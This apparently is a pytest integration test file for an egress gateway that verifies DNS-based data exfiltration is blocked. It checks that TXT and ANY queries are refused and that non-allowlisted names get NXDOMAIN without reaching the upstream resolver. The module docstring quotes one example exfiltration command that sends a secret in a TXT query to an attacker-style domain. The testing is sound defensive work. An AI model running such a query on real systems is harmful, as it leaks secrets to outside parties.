"""P0#3 — DNS exfil channel closed (§6.3 of the EC design).

Four invariants under test against the PLATFORM DNS policy (the DNS
plane no longer consults tenant rules or source identity — see
``rolemesh.egress.dns_policy``):

  1. Any qtype outside {A, AAAA, CNAME} returns REFUSED — the
     classic DNS exfil payload ``dig TXT $SECRET.attacker.com`` gets
     nothing, even for an allowlisted apex.
  2. An A query for a domain NOT in EGRESS_DNS_ALLOWLIST returns
     NXDOMAIN AND never reaches the upstream resolver (no signal to
     the attacker's authoritative DNS).
  3. The answer is identical for an UNREGISTERED probe — no lifecycle
     event, no identity. Platform policy means the resolver needs no
     idea who is asking, and fail-closed needs no registration.
  4. An A query for an allowlisted domain (``dns.google``, set in
     conftest's gateway Env) recurses upstream and resolves NOERROR.

Because the probe container doesn't have ``dig`` preinstalled, we
construct minimal DNS query packets with pure Python stdlib and parse
rcode out of the response. Less ergonomic than dig, but avoids pulling
another image or installing packages on an Internal=true bridge.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import pytest

if TYPE_CHECKING:
    from .helpers import Topology

pytestmark = [
    pytest.mark.integration,
    pytest.mark.asyncio(loop_scope="session"),
]


# Must match conftest's EGRESS_DNS_ALLOWLIST entry on the gateway Env.
ALLOWLISTED_NAME = "dns.google"


def _dns_probe_script(qname: str, qtype: str, gateway_ip: str) -> str:
    """Send one DNS query to the gateway's resolver and print rcode.

    Bypasses ``/etc/resolv.conf`` because Docker's user-defined bridge
    networks pin 127.0.0.11 (embedded DNS) as the primary resolver,
    shadowing the ``--dns`` flag. We dial the gateway directly to
    prove the authoritative-resolver path does what we expect.
    """
    qtypes = {"A": 1, "AAAA": 28, "CNAME": 5, "TXT": 16, "ANY": 255}
    qt = qtypes[qtype]
    return f"""
import socket, struct

def encode_name(name):
    parts = name.split('.')
    out = b''
    for p in parts:
        out += bytes([len(p)]) + p.encode()
    out += b'\\x00'
    return out

tid = 0x1234
flags = 0x0100  # standard query, RD=1
question = encode_name('{qname}') + struct.pack('>HH', {qt}, 1)
packet = struct.pack('>HHHHHH', tid, flags, 1, 0, 0, 0) + question

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
s.sendto(packet, ('{gateway_ip}', 53))
try:
    data, _ = s.recvfrom(4096)
except socket.timeout:
    print('RESULT=TIMEOUT')
    raise SystemExit(0)
_, rflags, _, _, _, _ = struct.unpack('>HHHHHH', data[:12])
rcode = rflags & 0x000F
names = {{0: 'NOERROR', 3: 'NXDOMAIN', 4: 'NOTIMP', 5: 'REFUSED'}}
print(f'RESULT={{names.get(rcode, f"CODE{{rcode}}")}}')
"""


async def test_txt_query_refused(
    topology: Topology, per_test_cleanup: None
) -> None:
    """TXT qtype MUST return REFUSED even for names inside the
    allowlist — otherwise an attacker with a whitelisted apex can
    still exfiltrate data via TXT records."""
    probe = await topology.spawn_probe()

    rc, out = await probe.exec_sh(
        f"python3 - <<'PY'\n{_dns_probe_script(ALLOWLISTED_NAME, 'TXT', topology.gateway_ip_on_agent_net)}\nPY"
    )
    assert rc == 0, out
    assert "RESULT=REFUSED" in out, out


async def test_any_query_refused(
    topology: Topology, per_test_cleanup: None
) -> None:
    """ANY is the other classic exfil multiplexer — separate test so
    the failure mode is attributed correctly."""
    probe = await topology.spawn_probe()

    rc, out = await probe.exec_sh(
        f"python3 - <<'PY'\n{_dns_probe_script('example.com', 'ANY', topology.gateway_ip_on_agent_net)}\nPY"
    )
    assert rc == 0, out
    assert "RESULT=REFUSED" in out, out


async def test_a_query_blocked_domain_is_nxdomain(
    topology: Topology, per_test_cleanup: None
) -> None:
    """A query for a non-allowlisted name gets NXDOMAIN — and crucially
    the upstream resolver never sees the query, so the attacker's
    authoritative DNS records no hit.

    Deliberately NO lifecycle event for this probe: the platform
    policy must answer identically for an agent the gateway has never
    heard of (fail-closed without registration)."""
    probe = await topology.spawn_probe()

    rc, out = await probe.exec_sh(
        f"python3 - <<'PY'\n{_dns_probe_script('evil-unknown-host-p0-3.test', 'A', topology.gateway_ip_on_agent_net)}\nPY"
    )
    assert rc == 0, out
    assert "RESULT=NXDOMAIN" in out, out


async def test_a_query_allowlisted_domain_resolves(
    topology: Topology, per_test_cleanup: None
) -> None:
    """Allow path: a name on the platform allowlist recurses to the
    real upstream resolvers and comes back NOERROR. Needs outbound
    internet from the Docker host (same requirement as image pulls)."""
    probe = await topology.spawn_probe()

    rc, out = await probe.exec_sh(
        f"python3 - <<'PY'\n{_dns_probe_script(ALLOWLISTED_NAME, 'A', topology.gateway_ip_on_agent_net)}\nPY"
    )
    assert rc == 0, out
    assert "RESULT=NOERROR" in out, out
